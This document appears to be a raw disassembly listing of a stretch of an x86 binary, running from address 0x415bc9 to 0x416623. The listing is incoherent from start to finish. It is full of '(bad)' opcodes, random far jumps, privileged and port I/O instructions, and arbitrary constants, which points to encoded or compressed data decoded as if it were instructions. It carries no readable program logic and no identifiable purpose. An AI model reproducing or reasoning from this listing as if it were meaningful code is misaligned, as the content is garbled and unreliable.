  415bc9:	inc    ebp
  415bca:	vorps  ymm1,ymm2,YMMWORD PTR [eax]
  415bce:	push   0x9
  415bd0:	mov    ?,WORD PTR [edi+0x57ccb362]
  415bd6:	lock aam 0xf1
  415bd9:	xlat   BYTE PTR es:[ebx]
  415bdb:	mov    ah,0x2
  415bdd:	int3   
  415bde:	in     eax,dx
  415bdf:	cld    
  415be0:	jb     0x415bb1
  415be2:	retf   0xd308
  415be5:	sbb    dh,BYTE PTR [ecx-0x54]
  415be8:	or     eax,0x164169f5
  415bed:	sub    DWORD PTR ds:0x67a8d8b9,eax
  415bf3:	mov    BYTE PTR [ecx],bh
  415bf5:	jecxz  0x415bd7
  415bf7:	dec    ecx
  415bf8:	(bad)  
  415bf9:	cmp    al,BYTE PTR [esi-0xf]
  415bfc:	outs   dx,DWORD PTR ds:[esi]
  415bfd:	jecxz  0x415bb8
  415bff:	(bad)  
  415c00:	stc    
  415c01:	test   BYTE PTR [eax+0x28d21d42],al
  415c07:	adc    al,0x9b
  415c09:	mov    ah,0xaf
  415c0b:	adc    DWORD PTR [ecx+0x7dc64338],0x7b
  415c12:	nop
  415c13:	pop    ds
  415c14:	ins    DWORD PTR es:[edi],dx
  415c15:	(bad)  
  415c17:	rcr    bl,0x15
  415c1a:	xchg   edi,eax
  415c1b:	arpl   WORD PTR [edi-0xd],di
  415c1e:	xor    cl,BYTE PTR [ecx+0x13]
  415c21:	sbb    BYTE PTR [ecx],bl
  415c23:	cld    
  415c24:	mov    ebx,0x1afb3f
  415c29:	adc    BYTE PTR [ebp+edi*1+0x62],cl
  415c2d:	std    
  415c2e:	dec    edx
  415c2f:	loope  0x415bef
  415c31:	dec    edi
  415c32:	cmp    cl,BYTE PTR [ecx]
  415c34:	inc    ecx
  415c35:	jnp    0x415c3f
  415c37:	inc    edi
  415c38:	xchg   edi,eax
  415c39:	mov    eax,ds:0xe93f944c
  415c3e:	pusha  
  415c3f:	jnp    0x415c2b
  415c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c42:	mov    ds:0xc2ea2516,eax
  415c47:	xlat   BYTE PTR gs:[ebx]
  415c49:	(bad)  
  415c4a:	jg     0x415bcd
  415c4c:	imul   edi,DWORD PTR [edx],0xffffff92
  415c4f:	push   0x1d
  415c51:	pop    ds
  415c52:	pop    esp
  415c53:	jo     0x415c79
  415c55:	fucomi st,st(4)
  415c57:	or     al,0x5e
  415c59:	scas   al,BYTE PTR es:[edi]
  415c5a:	push   ss
  415c5b:	or     eax,0x9445f964
  415c60:	lods   eax,DWORD PTR ds:[esi]
  415c61:	lods   eax,DWORD PTR ds:[esi]
  415c62:	jne    0x415c99
  415c64:	cld    
  415c65:	jge    0x415c61
  415c67:	in     eax,0xc
  415c69:	xor    esi,edx
  415c6b:	mov    esp,0x79dcdc18
  415c70:	(bad)  
  415c71:	mov    ah,0x26
  415c73:	rcr    DWORD PTR [eax+eiz*2-0x4b],1
  415c77:	xor    al,0xba
  415c79:	dec    ecx
  415c7a:	cmc    
  415c7b:	jecxz  0x415cbb
  415c7d:	aam    0x42
  415c7f:	xor    DWORD PTR ss:[esi],ecx
  415c82:	xor    al,0x6b
  415c84:	xchg   DWORD PTR [edx],eax
  415c86:	cli    
  415c87:	push   ebx
  415c88:	dec    eax
  415c89:	(bad)  
  415c8b:	ficomp WORD PTR [esi+0x4c09ec48]
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x40f0eb1f
  415d03:	inc    edi
  415d04:	inc    eax
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR ds:0xe6000001,al
  415d0d:	ins    BYTE PTR es:[edi],dx
  415d0e:	lds    edi,FWORD PTR [eax+0x14]
  415d11:	lods   al,BYTE PTR ds:[esi]
  415d12:	push   edi
  415d13:	mov    ebx,0xd152ff02
  415d18:	(bad)  
  415d19:	dec    ebx
  415d1a:	xor    dl,BYTE PTR [edx]
  415d1c:	and    ebx,DWORD PTR [ebx+0x26266b4]
  415d22:	jl     0x415d77
  415d24:	lea    esi,[ecx]
  415d26:	enter  0x6de2,0xdf
  415d2a:	clc    
  415d2b:	je     0x415cda
  415d2d:	or     DWORD PTR [ebx+esi*2],0x41c84aaa
  415d34:	mov    WORD PTR [eax],es
  415d36:	lea    eax,[ebp-0x48]
  415d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d3a:	popf   
  415d3b:	aad    0x1d
  415d3d:	fdiv   DWORD PTR [edi+0x5097092b]
  415d43:	xchg   ebx,eax
  415d44:	stos   DWORD PTR es:[edi],eax
  415d45:	jg     0x415d59
  415d47:	dec    esi
  415d48:	inc    ebp
  415d49:	arpl   sp,cx
  415d4b:	cmp    eax,DWORD PTR [edi+0x2f]
  415d4e:	cli    
  415d4f:	and    bh,ah
  415d51:	lea    eax,[edi-0xd]
  415d54:	pop    es
  415d55:	data16 fdivr QWORD PTR [edi-0x41]
  415d59:	jno    0x415dda
  415d5b:	and    al,0xff
  415d5d:	adc    DWORD PTR ss:0x4104535,edx
  415d64:	sbb    al,0xeb
  415d66:	fbld   TBYTE PTR [eax+0x18bd042d]
  415d6c:	pop    ds
  415d6d:	mov    eax,ds:0xeae86425
  415d72:	xchg   esi,eax
  415d73:	je     0x415dc4
  415d75:	(bad)  
  415d76:	stos   DWORD PTR es:[edi],eax
  415d77:	dec    esi
  415d78:	aas    
  415d79:	push   edi
  415d7a:	pop    esi
  415d7b:	fcomp  st(2)
  415d7d:	sbb    edx,DWORD PTR [ebp+0x59]
  415d80:	imul   edx,DWORD PTR [ebx-0x4b5d122d],0x30
  415d87:	mov    eax,ds:0x73534ba
  415d8c:	test   DWORD PTR [eax],edi
  415d8e:	loop   0x415d49
  415d90:	add    DWORD PTR [ebx+esi*1+0x5f],eax
  415d94:	jle    0x415e0e
  415d96:	and    BYTE PTR [eax-0x1c16c206],dl
  415d9c:	shl    DWORD PTR [eax+0x7a],1
  415d9f:	sbb    ebx,edx
  415da1:	test   BYTE PTR [esi],bl
  415da3:	jmp    0x83ad7fc5
  415da8:	jmp    0xdcf1f1c7
  415dad:	clc    
  415dae:	mov    ebx,0x34ac4006
  415db4:	pusha  
  415db5:	add    al,0x26
  415db7:	push   cs
  415db8:	das    
  415db9:	jmp    0x415d47
  415dbb:	mov    ecx,0xd030d477
  415dc0:	xchg   DWORD PTR [eax+0x47],ebx
  415dc3:	mov    ah,0xb7
  415dc5:	dec    ecx
  415dc6:	adc    DWORD PTR [ebp+0x62a2a042],0x4a
  415dcd:	rcr    edx,1
  415dcf:	xchg   ebx,eax
  415dd0:	push   es
  415dd1:	lods   eax,DWORD PTR ds:[esi]
  415dd2:	jg     0x415db8
  415dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dd5:	jmp    0x3d30:0x2e711f81
  415ddc:	stos   DWORD PTR es:[edi],eax
  415ddd:	sbb    al,0xb8
  415ddf:	and    BYTE PTR [edi+ebp*8+0x4042e728],bl
  415de6:	scas   al,BYTE PTR es:[edi]
  415de7:	scas   al,BYTE PTR es:[edi]
  415de8:	xchg   ebx,eax
  415de9:	js     0x415da1
  415deb:	mov    esp,0xec23495f
  415df0:	fcmovbe st,st(1)
  415df2:	mov    edi,0xb6ee610d
  415df7:	xor    BYTE PTR [esi+0x37248cef],bl
  415dfd:	iret   
  415dfe:	hlt    
  415dff:	loopne 0x415e73
  415e01:	xlat   BYTE PTR ds:[ebx]
  415e02:	rcl    dl,cl
  415e04:	outs   dx,DWORD PTR ds:[esi]
  415e05:	sti    
  415e06:	ret    0xbc0a
  415e09:	mov    ch,0x88
  415e0b:	pop    ebx
  415e0c:	add    BYTE PTR [esp+ecx*2-0x31],al
  415e10:	sbb    BYTE PTR [eax],al
	...
  415e72:	add    BYTE PTR [eax],al
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x17]
  415e81:	xchg   edi,eax
  415e82:	in     al,dx
  415e83:	xor    al,0x45
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR ds:0xe9000001,al
  415e8d:	das    
  415e8e:	mov    gs:0x4f2e7284,eax
  415e94:	arpl   WORD PTR [edi-0x765e3c2b],bp
  415e9a:	pop    edx
  415e9b:	inc    esi
  415e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e9e:	push   edi
  415e9f:	fbstp  TBYTE PTR ds:0xb2a12aad
  415ea5:	dec    ebx
  415ea6:	hlt    
  415ea7:	enter  0x86bd,0xab
  415eab:	mov    ebx,0xe28dbd61
  415eb0:	cmp    dh,BYTE PTR [edi-0x1fb34ad1]
  415eb6:	push   cs
  415eb7:	add    BYTE PTR [ebx+ecx*8],0x19
  415ebb:	leave  
  415ebc:	cmp    dl,dh
  415ebe:	dec    ebx
  415ebf:	test   al,0xfb
  415ec1:	mov    ah,0x67
  415ec3:	fwait
  415ec4:	jmp    0xd7af:0x8b90fdb9
  415ecb:	data16 and ch,ch
  415ece:	mov    ch,0xc9
  415ed0:	push   ebp
  415ed1:	sti    
  415ed2:	xchg   edi,eax
  415ed3:	jmp    0xda7ebe3a
  415ed8:	test   al,0x1f
  415eda:	fst    st(4)
  415edc:	mov    edx,0x6c8eee35
  415ee1:	sbb    ebp,DWORD PTR [esi+edx*8]
  415ee4:	outs   dx,BYTE PTR ds:[esi]
  415ee5:	inc    esi
  415ee6:	add    BYTE PTR [ebp-0x5906a3a],dh
  415eec:	cmp    ebx,DWORD PTR [ebp+0x6935e433]
  415ef2:	outs   dx,DWORD PTR ds:[esi]
  415ef3:	sub    BYTE PTR [ebp+0x7f],0x47
  415ef7:	bswap  esi
  415ef9:	inc    esi
  415efa:	les    esi,FWORD PTR [ecx-0x24]
  415efd:	into   
  415efe:	push   es
  415eff:	(bad)  
  415f00:	push   ebp
  415f01:	mov    ds:0xc0540009,al
  415f06:	or     BYTE PTR [ecx-0x4854d5f1],dl
  415f0c:	cmp    ecx,DWORD PTR [edi-0x2e068512]
  415f12:	push   ebx
  415f13:	call   0xdfc33b0
  415f18:	hlt    
  415f19:	push   ebx
  415f1a:	and    BYTE PTR gs:[ecx-0x72],dl
  415f1e:	push   ss
  415f1f:	pop    edi
  415f20:	dec    esi
  415f21:	aad    0x1e
  415f23:	adc    eax,0xf98242ef
  415f28:	aam    0x39
  415f2a:	scas   al,BYTE PTR es:[edi]
  415f2b:	pop    esi
  415f2c:	cwde   
  415f2d:	loopne 0x415ef6
  415f2f:	bound  ebp,QWORD PTR [ebx-0x17]
  415f32:	call   0xbbe2:0x84b87503
  415f39:	xchg   ecx,eax
  415f3a:	sti    
  415f3b:	in     al,0x63
  415f3d:	mov    edi,0xfa269430
  415f42:	cmp    edi,ecx
  415f44:	imul   esp,DWORD PTR [ebx-0x2b],0xffffffbd
  415f48:	xchg   ebx,eax
  415f49:	out    dx,eax
  415f4a:	inc    eax
  415f4b:	adc    al,0x2c
  415f4d:	int    0x91
  415f4f:	cmp    eax,0x7fe72398
  415f54:	aas    
  415f55:	daa    
  415f56:	or     eax,0xface2eb4
  415f5b:	mov    ah,0x14
  415f5d:	les    edi,FWORD PTR [esp+esi*4-0x21]
  415f61:	mov    esp,0xe6fac2db
  415f66:	je     0x415f98
  415f68:	fwait
  415f69:	dec    edi
  415f6a:	xchg   ebp,eax
  415f6b:	add    BYTE PTR [edi+0x3abc84ce],bh
  415f71:	add    ch,ch
  415f73:	xchg   ebp,eax
  415f74:	outs   dx,BYTE PTR ds:[esi]
  415f75:	fisub  DWORD PTR [eax]
  415f77:	outs   dx,DWORD PTR ds:[esi]
  415f78:	test   BYTE PTR [ebx+0x1],bh
  415f7b:	push   ds
  415f7c:	xor    edi,DWORD PTR [ebp-0x6c1f34ea]
  415f82:	sub    eax,0x8de97b85
  415f87:	jae    0x415f1e
  415f89:	cmp    ch,bh
  415f8b:	jae    0x415f5b
  415f8d:	les    ebp,FWORD PTR [eax+0xfee4]
	...
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	jg     0x415ff7
  416002:	into   
  416003:	cmovp  ebp,eax
  416006:	add    BYTE PTR [eax],al
  416008:	add    eax,0xd3000001
  41600d:	jg     0x416068
  41600f:	loopne 0x41601e
  416011:	dec    esp
  416012:	lock xchg edi,eax
  416014:	xchg   dl,bl
  416016:	(bad)  
  416017:	in     al,0x2e
  416019:	ins    BYTE PTR es:[edi],dx
  41601a:	push   eax
  41601b:	fwait
  41601c:	and    DWORD PTR [ebp-0x44ff2738],edi
  416022:	aam    0x53
  416024:	int3   
  416025:	and    ebx,DWORD PTR [ebx+0x63]
  416028:	daa    
  416029:	adc    edx,ebp
  41602b:	push   ebp
  41602c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41602d:	in     eax,dx
  41602e:	inc    ecx
  41602f:	fdivr  st(5),st
  416031:	scas   eax,DWORD PTR es:[edi]
  416032:	cwde   
  416033:	inc    edi
  416034:	sbb    BYTE PTR [ebp-0x1edc4e0a],bl
  41603a:	jb     0x416033
  41603c:	jae    0x416099
  41603e:	or     cl,ch
  416040:	retf   
  416041:	pop    ds
  416042:	add    eax,0x13f0309a
  416047:	xchg   edi,eax
  416048:	mov    dh,0x56
  41604a:	add    al,0xa7
  41604c:	jmp    0x9c09f76b
  416051:	cmp    dl,BYTE PTR [ebp-0x7ea0325d]
  416057:	inc    esp
  416058:	xchg   edx,eax
  416059:	mov    bl,0xee
  41605b:	aaa    
  41605c:	jle    0x416036
  41605e:	inc    BYTE PTR [edx+0x3c]
  416061:	xlat   BYTE PTR ds:[ebx]
  416062:	(bad)  
  416063:	aas    
  416064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416065:	out    0xdb,eax
  416067:	movzx  ecx,WORD PTR [ebx]
  41606a:	jo     0x41603e
  41606c:	jg     0x4160e1
  41606e:	mov    ah,0xf9
  416070:	mov    DWORD PTR [eax],ecx
  416072:	ss mov ecx,0x9a88cc86
  416078:	inc    ebx
  416079:	adc    al,0x59
  41607b:	cmp    al,BYTE PTR [ecx]
  41607d:	bound  edi,QWORD PTR [esi]
  41607f:	add    ebp,DWORD PTR ds:0x8fb22a43
  416085:	cwde   
  416086:	mov    dl,0x4
  416088:	push   eax
  416089:	sub    edi,DWORD PTR [ecx]
  41608b:	mov    ds:0x1ea9f5ae,al
  416090:	ds aaa 
  416092:	jmp    0x57dab74e
  416097:	mov    ecx,0x38fc99be
  41609c:	push   ecx
  41609d:	xor    DWORD PTR [edi],eax
  41609f:	dec    esi
  4160a0:	aam    0x46
  4160a2:	mov    ch,BYTE PTR [ecx+0x295602d]
  4160a8:	inc    eax
  4160a9:	sbb    DWORD PTR [ebx-0x684c7f12],ebp
  4160af:	xchg   DWORD PTR [eax-0x45],esp
  4160b2:	jle    0x416088
  4160b4:	push   ecx
  4160b5:	fadd   st,st(0)
  4160b7:	dec    ebp
  4160b8:	push   ss
  4160b9:	mov    WORD PTR [ecx+0x54],es
  4160bc:	mov    eax,ds:0x52552dcc
  4160c1:	mov    esp,0x4cecb768
  4160c6:	data16 adc al,0xae
  4160c9:	push   ds
  4160ca:	add    eax,0xe3b5f5c
  4160cf:	daa    
  4160d0:	push   0x58
  4160d2:	iret   
  4160d3:	pushf  
  4160d4:	test   eax,0x4125b579
  4160d9:	test   ebp,ebp
  4160db:	shr    BYTE PTR [edx],1
  4160dd:	mov    WORD PTR [edx+0x2f06135a],fs
  4160e3:	jmp    0x416149
  4160e5:	mov    bl,BYTE PTR [ebx]
  4160e7:	test   BYTE PTR [edi],al
  4160e9:	xchg   edx,eax
  4160ea:	adc    ch,BYTE PTR [eax]
  4160ec:	test   DWORD PTR [esi],0x48659714
  4160f2:	inc    esi
  4160f3:	push   ss
  4160f4:	dec    eax
  4160f5:	sub    eax,0x8ba227ff
  4160fa:	ins    DWORD PTR es:[edi],dx
  4160fb:	pop    ebx
  4160fc:	pop    ss
  4160fd:	add    dh,dl
  4160ff:	aas    
  416100:	cmp    eax,0xeb37cb74
  416105:	mov    edi,0x9e02896e
  41610a:	mov    ebp,0xd48f371e
  41610f:	popf   
  416110:	arpl   WORD PTR [eax],ax
	...
  416172:	add    BYTE PTR [eax],al
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0xe1ddf9f3
  416183:	dec    ebx
  416184:	dec    edi
  416185:	jmp    0x146618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	mov    ah,0x1d
  41618e:	out    0xfd,eax
  416190:	jl     0x416202
  416192:	jmp    0x8284:0x2a0b0239
  416199:	xchg   esi,eax
  41619a:	jnp    0x416186
  41619c:	cdq    
  41619d:	sub    cl,BYTE PTR [eax+eax*4]
  4161a0:	jb     0x41620d
  4161a2:	push   edi
  4161a3:	sub    al,0xa8
  4161a5:	stos   DWORD PTR es:[edi],eax
  4161a6:	aaa    
  4161a7:	cmp    DWORD PTR [ecx+0x73c428d4],edx
  4161ad:	test   eax,0xd1a839e1
  4161b2:	xchg   esp,eax
  4161b3:	mov    eax,ds:0xefd3a163
  4161b8:	xchg   ecx,eax
  4161b9:	sub    eax,0xf9275f86
  4161be:	movzx  esi,WORD PTR es:[esi]
  4161c2:	adc    eax,0xf4a4b519
  4161c7:	loop   0x416215
  4161c9:	sbb    bh,cl
  4161cb:	lods   eax,DWORD PTR ds:[esi]
  4161cc:	arpl   di,bp
  4161ce:	dec    ecx
  4161cf:	inc    DWORD PTR [esi-0x2f]
  4161d2:	in     al,0xb
  4161d4:	loope  0x4161d5
  4161d6:	fisttp WORD PTR [edi+0x7296510a]
  4161dc:	mov    esp,ecx
  4161de:	test   al,0xfb
  4161e0:	(bad)  
  4161e1:	xlat   BYTE PTR ds:[ebx]
  4161e2:	pop    ss
  4161e3:	arpl   ax,ax
  4161e5:	mov    eax,ds:0xebc26fa9
  4161ea:	xchg   ebp,eax
  4161eb:	or     al,0xd7
  4161ed:	mov    edi,0x85a58217
  4161f2:	popa   
  4161f3:	loop   0x4161dd
  4161f5:	xchg   ebx,eax
  4161f6:	xchg   esp,eax
  4161f7:	xchg   edi,eax
  4161f8:	in     eax,0x10
  4161fa:	sbb    BYTE PTR [edx+0x4783be18],0x82
  416201:	dec    edi
  416202:	ja     0x41624e
  416204:	xchg   edx,eax
  416205:	sub    bl,BYTE PTR [ecx]
  416207:	int    0x50
  416209:	dec    esi
  41620a:	inc    eax
  41620b:	xchg   ebp,eax
  41620c:	mov    bh,0xb0
  41620e:	mov    bh,0xc1
  416210:	call   0xcac32526
  416215:	icebp  
  416216:	pop    ebx
  416217:	rol    bh,cl
  416219:	ja     0x4161f9
  41621b:	cmc    
  41621c:	and    al,0x5f
  41621e:	inc    dx
  416220:	in     al,dx
  416221:	aad    0x87
  416223:	rcr    BYTE PTR [edx-0x880b3bb],1
  416229:	mov    edi,DWORD PTR [ecx]
  41622b:	pop    eax
  41622c:	dec    esp
  41622d:	lahf   
  41622e:	call   0xc6a7:0x840b55fd
  416235:	adc    cl,ch
  416237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416238:	mov    cl,0x7
  41623a:	pop    ecx
  41623b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41623c:	div    DWORD PTR [ebx+0x696da066]
  416242:	inc    edi
  416243:	cmp    al,0x42
  416245:	scas   eax,DWORD PTR es:[edi]
  416246:	hlt    
  416247:	jno    0x4162b1
  416249:	scas   eax,DWORD PTR es:[edi]
  41624a:	int3   
  41624b:	shr    edi,cl
  41624d:	xchg   ebx,eax
  41624e:	sbb    ah,BYTE PTR [edi+0x65b5857f]
  416254:	loop   0x4162b1
  416256:	push   ebp
  416257:	scas   eax,DWORD PTR es:[edi]
  416258:	xchg   edi,eax
  41625a:	push   edi
  41625b:	repnz sub BYTE PTR [edi+0x7ca76b09],al
  416262:	adc    al,0xf8
  416264:	xchg   edi,eax
  416265:	lea    ebp,[ebx]
  416267:	adc    dh,BYTE PTR [ecx-0x7c]
  41626a:	fdivr  QWORD PTR [edx]
  41626c:	mov    dh,0xff
  41626e:	pusha  
  41626f:	fisttp DWORD PTR [ecx+0x776442f3]
  416275:	loop   0x4162d8
  416277:	jno    0x4161fa
  416279:	cs mov ebx,0x8aa52134
  41627f:	clc    
  416280:	sub    al,0x66
  416282:	mov    WORD PTR [eax-0x1e],gs
  416285:	push   ecx
  416286:	idiv   DWORD PTR [edx-0x33c01ed]
  41628c:	adc    DWORD PTR [edx+0x9b52e0],ecx
	...
  4162f2:	add    BYTE PTR [eax],al
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x5402:0x6ff3e1ee
  416305:	jmp    0x0:0x1050000
  41630c:	icebp  
  41630d:	and    al,0xb6
  41630f:	pop    eax
  416310:	xor    al,0x69
  416312:	and    esi,ebx
  416314:	cwde   
  416315:	cwde   
  416316:	xor    eax,0xe26c340
  41631b:	or     eax,eax
  41631d:	enter  0xfc1f,0x7c
  416321:	popf   
  416322:	and    al,0x2c
  416324:	cdq    
  416325:	pop    ebp
  416326:	sub    al,0x18
  416328:	sub    eax,0x1a746075
  41632d:	adc    al,0x6b
  41632f:	xchg   DWORD PTR [edx-0x28b04960],eax
  416335:	mov    ebx,0x2094bdac
  41633a:	lds    edx,FWORD PTR [ecx-0x621da657]
  416340:	fcomp  QWORD PTR [esi-0x7970ac6c]
  416346:	add    ecx,0x16
  416349:	shl    BYTE PTR [ecx],0xb
  41634c:	pop    ebx
  41634d:	pop    eax
  41634e:	cld    
  41634f:	leave  
  416350:	rol    edi,cl
  416352:	pusha  
  416353:	jecxz  0x416312
  416355:	cmp    DWORD PTR [edx+ebp*2],ebx
  416358:	dec    esp
  416359:	push   ds
  41635a:	or     al,0x89
  41635c:	push   edi
  41635d:	loop   0x4163b4
  41635f:	adc    BYTE PTR [edx+0x6e],al
  416362:	into   
  416363:	jmp    0xfbf0:0xe50a144
  41636a:	jae    0x416338
  41636c:	ins    DWORD PTR es:[edi],dx
  41636d:	cld    
  41636e:	dec    esp
  41636f:	dec    ebx
  416370:	dec    esp
  416371:	pop    ds
  416372:	fst    QWORD PTR [eax]
  416374:	cmp    BYTE PTR [edx],0xd
  416377:	icebp  
  416378:	mov    cl,0x4d
  41637a:	scas   eax,DWORD PTR es:[edi]
  41637b:	sbb    DWORD PTR [edx+ebx*4],edi
  41637e:	test   al,0x2e
  416380:	xor    eax,0x55f725f0
  416385:	pusha  
  416386:	call   0xd37da1cb
  41638b:	int    0x38
  41638d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41638e:	sub    al,ah
  416390:	xchg   ebp,eax
  416391:	jge    0x416346
  416393:	push   esi
  416394:	loope  0x416364
  416396:	jmp    0xdaef:0xcaf1698a
  41639d:	test   BYTE PTR [esi+0xf811c73],ah
  4163a3:	sbb    esi,DWORD PTR [eax-0x66]
  4163a6:	jmp    0x5b1df4ec
  4163ab:	in     al,dx
  4163ac:	cmc    
  4163ad:	add    eax,0x2b3260f2
  4163b2:	das    
  4163b3:	mov    DWORD PTR [edi-0x1d],ecx
  4163b6:	push   esp
  4163b7:	add    dl,BYTE PTR [esi]
  4163b9:	adc    dl,BYTE PTR [edi-0x20a96040]
  4163bf:	sub    eax,0x970c9ac8
  4163c4:	xchg   edx,eax
  4163c5:	int    0xc5
  4163c7:	add    BYTE PTR [edi-0x77],ch
  4163ca:	jbe    0x416449
  4163cc:	fucomip st,st(5)
  4163ce:	add    DWORD PTR [eax+0x77],esp
  4163d1:	xlat   BYTE PTR ds:[ebx]
  4163d2:	mov    bh,0xc9
  4163d4:	and    al,0x32
  4163d6:	out    dx,al
  4163d7:	push   cs
  4163d8:	sbb    al,0x7c
  4163da:	add    ebx,edx
  4163dc:	xchg   ecx,eax
  4163dd:	lahf   
  4163de:	cmp    al,0x29
  4163e0:	shl    BYTE PTR [esp+edi*1+0x958d95c],0x7a
  4163e8:	or     dl,BYTE PTR [esi-0x1c2b5a5b]
  4163ee:	stos   DWORD PTR es:[edi],eax
  4163ef:	xlat   BYTE PTR ds:[ebx]
  4163f0:	or     DWORD PTR ds:0x2c665645,ecx
  4163f6:	fistp  WORD PTR [ecx-0x60]
  4163f9:	inc    eax
  4163fa:	and    esp,DWORD PTR [ecx+0x5e]
  4163fd:	mov    eax,0x297546bb
  416402:	mov    bl,BYTE PTR [edi+0x43a615e1]
  416408:	fldenv [ecx]
  41640a:	sbb    ecx,DWORD PTR [eax+esi*1+0xcdd898a]
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	inc    ebp
  416481:	(bad)
  416484:	pop    ecx
  416485:	jmp    0x416487
  416487:	add    BYTE PTR ds:0x49000001,al
  41648d:	vorpd  xmm6,xmm4,XMMWORD PTR [ebp+0x70]
  416492:	push   es
  416493:	xchg   ebx,eax
  416494:	addr16 in eax,0x1c
  416497:	push   edi
  416498:	mov    ds:0x16b376ae,al
  41649d:	js     0x41644f
  41649f:	ret    0x74fe
  4164a2:	xchg   DWORD PTR [ebx+0x46],esp
  4164a5:	pop    esp
  4164a6:	sub    DWORD PTR [eax+edi*1],ebp
  4164a9:	dec    ebx
  4164aa:	jo     0x41652b
  4164ac:	pushf  
  4164ad:	int3   
  4164ae:	scas   al,BYTE PTR es:[edi]
  4164af:	mov    ebp,0x6abef7c8
  4164b4:	add    bh,BYTE PTR [ecx]
  4164b6:	iret   
  4164b7:	rcl    BYTE PTR [eax],1
  4164b9:	(bad)  
  4164ba:	push   ecx
  4164bb:	retf   
  4164bc:	jae    0x4164d8
  4164be:	jb     0x41651e
  4164c0:	mov    esp,0xffc8f4ba
  4164c5:	es sbb edi,eax
  4164c8:	dec    esp
  4164c9:	jo     0x416500
  4164cb:	jmp    0x7baf:0x12ac1210
  4164d2:	add    ecx,DWORD PTR [esp+ecx*4-0x5d321fbe]
  4164d9:	mov    ecx,0x1ebbe17e
  4164de:	shl    ebx,cl
  4164e0:	out    dx,eax
  4164e1:	test   eax,0x77dffa9
  4164e7:	(bad)  
  4164e8:	ds xor eax,0x4a909aa1
  4164ee:	adc    bl,BYTE PTR ds:0x32d72df
  4164f4:	loope  0x4164e6
  4164f6:	or     dl,dh
  4164f8:	xchg   esp,eax
  4164f9:	add    ah,BYTE PTR [ebx+0x14]
  4164fc:	push   es
  4164fd:	out    dx,al
  4164fe:	ret    0xe03a
  416501:	add    DWORD PTR [edx+0x3c],ebp
  416504:	dec    esi
  416505:	pop    edx
  416506:	loope  0x416523
  416508:	sbb    eax,0x7c22a0e6
  41650d:	aas    
  41650e:	test   DWORD PTR [ebx-0x3f],0x3433f471
  416515:	out    dx,eax
  416516:	adc    DWORD PTR [ecx-0x37b938a4],0xc24abb5a
  416520:	loopne 0x416516
  416522:	pusha  
  416523:	dec    ebx
  416524:	shr    DWORD PTR [ebp+edi*1+0x7a949b8c],0x85
  41652c:	sub    eax,DWORD PTR [esi+0x9]
  41652f:	enter  0x5cc,0x53
  416533:	fidivr WORD PTR [edi-0xc04ef64]
  416539:	inc    ebx
  41653a:	ret    0x7fa
  41653d:	loop   0x4164e9
  41653f:	xor    al,0x94
  416541:	aam    0x25
  416543:	cmp    ebx,edi
  416545:	sbb    ebp,ebp
  416547:	sub    eax,0xeb8e3b65
  41654c:	and    DWORD PTR [edi+edx*4+0x686b9b14],esi
  416553:	add    edx,edi
  416555:	aad    0xb2
  416557:	add    ecx,DWORD PTR [eax+edi*4-0x3d]
  41655b:	lds    eax,FWORD PTR [ebx-0x6b]
  41655e:	idiv   DWORD PTR [eax+0x65]
  416561:	lea    edi,[edi+eax*1-0x6c15becb]
  416568:	aas    
  416569:	in     eax,dx
  41656a:	push   cs
  41656b:	dec    ebp
  41656c:	pop    ss
  41656d:	or     BYTE PTR [ecx],cl
  41656f:	ds popa 
  416571:	daa    
  416572:	add    al,0xd2
  416574:	cmp    eax,0xd9fbf104
  416579:	in     al,0xea
  41657b:	fild   DWORD PTR [ebx-0x32aa6477]
  416581:	mov    cs,esp
  416583:	in     eax,dx
  416584:	sbb    eax,0x474d5891
  416589:	stos   DWORD PTR es:[edi],eax
  41658a:	div    DWORD PTR [esi+0x769544c1]
  416590:	mov    ds:0x0,eax
	...
  4165f1:	add    BYTE PTR [eax],al
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x274fbcac]
  416601:	push   esi
  416602:	push   ds
  416603:	rcr    DWORD PTR [esi-0x14],cl
  416606:	add    BYTE PTR [eax],al
  416608:	add    eax,0xb9000001
  41660d:	call   0xbc602eb2
  416612:	cmp    ebx,DWORD PTR [ecx]
  416614:	push   ds
  416615:	cmp    esp,DWORD PTR [ebx-0x26]
  416618:	xor    al,0x42
  41661a:	add    al,0x2d
  41661c:	mov    BYTE PTR ds:0xcf01d155,cl
  416622:	inc    esi
  416623:	arpl   WORD PTR gs:[eax+0x236920b8],cx
